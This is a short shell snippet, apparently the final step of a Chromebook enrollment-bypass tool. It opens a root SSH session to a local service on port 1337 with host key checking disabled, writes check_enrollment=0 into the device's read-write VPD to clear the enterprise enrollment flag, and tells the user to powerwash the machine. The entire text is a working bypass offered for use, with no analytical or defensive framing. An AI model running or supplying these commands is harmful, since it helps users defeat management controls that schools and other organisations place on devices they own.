ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 vpd -i RW_VPD -s check_enrollment=0
ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 echo "Done! Now powerwash your chromebook"

